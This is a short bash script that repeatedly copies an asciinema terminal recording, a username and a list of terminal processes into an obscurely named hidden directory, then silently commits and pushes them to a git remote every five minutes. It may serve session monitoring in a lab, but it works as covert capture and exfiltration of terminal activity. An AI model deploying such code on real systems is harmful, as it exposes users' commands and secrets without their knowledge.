#!/bin/bash
DATE=$(date +%F)
WD=/home/ubuntu/.config/.Fe7ege5/Recordings/tmp/${DATE}

while true
do
    if [ ! -d "$WD" ]; then
        mkdir -p $WD
    fi
    if [ -f "/tmp/asciinema/rec.cast" ]; then
        cp /tmp/asciinema/rec.cast $WD
    fi
    echo "$(date)" >> $WD/terminals.txt
    if [ -f /tmp/.USER_NAME ]; then cat /tmp/.USER_NAME >> $WD/terminals.txt; fi
    ps -fea|grep pts >> $WD/terminals.txt
    cd /home/ubuntu/.config/.Fe7ege5/
    git pull --rebase --quiet
    git add *
    git commit -am "Saving temp data" --quiet
    git push --quiet
    sleep 5m
done
